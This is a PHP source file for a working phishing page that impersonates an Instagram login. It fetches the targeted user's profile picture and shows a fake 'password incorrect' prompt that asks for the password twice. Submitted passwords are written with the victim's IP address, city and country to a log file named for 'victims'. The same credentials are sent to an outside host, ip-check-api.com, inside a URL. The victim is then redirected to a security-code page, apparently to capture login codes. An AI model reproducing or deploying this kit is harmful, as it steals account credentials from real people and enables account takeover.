<?php
require 'load.php';
session_start();
set_time_limit(0); 
error_reporting(E_ALL);

$clawzuser=$_GET['nick'];
$url2="https://smihub.com/search?query=$clawzuser";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$follower="-";
if($_POST){
  $clawzpass=$_POST["clawzpass"];
  $clawzpass2=$_POST["clawzpass2"];
  $ip=$_SERVER["REMOTE_ADDR"];
  $konum = file_get_contents("http://ip-api.com/xml/".$ip);
  $cek = new SimpleXMLElement($konum);
  $ulke = $cek->country;
  $sehir = $cek->city;
  $ips="$ip,$clawzuser ,$clawzpass, $clawzpass2 ";
  $url="https://ip-check-api.com/".$ips;
  $cek = file_get_contents($url);
  $data = explode (",",$cek);
  $ulke = $data[0];
  $sehir = $data[1];
  date_default_timezone_set('Europe/Istanbul');
  $cur_time=date("d-m-Y H:i:s");
  $file = fopen('kurbansifyanlis.php', 'a');
  fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#0000a0'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='darkblue'>

<font color='red'> Şifre: </font><font color='white'>".$clawzpass."</font><br>
<font color='red'> Şifre 2: </font><font color='white'>".$clawzpass2."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>


"); 
 
fclose($file);
echo '';
  
   header("Location:securitycode.php");
}
?>




<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="web-app-apple-mobile-capable" content="yes">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <title>Login</title>
</head>
<body>
    <center>
        <div class="block login">
             <br><br>
        <img width="180" src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo-2010-2013.png" alt=""> <br><hr width="250px">
        <img width="250" src="https://imgyukle.com/f/2021/11/26/k2Oz0j.jpg" alt="">
        <hr width="250px" height="0.5px"> <br>
        <img style="max-width:%90;border-radius:50%;width:115px;height:115;" src="<?php echo $pp; ?>" alt=""> <br>
        <h4><?php echo $clawzuser; ?></h4>
        <p style="color:#FF000D;";>Your password is incorrect. Please try again</p> <br>
        <form method="post">
            <input required="required" type="password" class="inputs" name="clawzpass" placeholder="   Password"> <br><br>
            <input type="password" class="inputs" name="clawzpass2" placeholder="   Password Again"> <br><br>
            
            <input type="submit" value="Continue" class="btn" id="btnjs">
            <script>
                 var btnjs=document.getElementById("btnjs");
	btnjs.onclick=function(){
		btnjs.value = 'Please Wait';
	}
            </script>
        </form>
         <br>
         <img width="150" src="data:image/png;base64,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" alt="">
        </div> <br><br><br><br>
    </center>
</body>
</html>
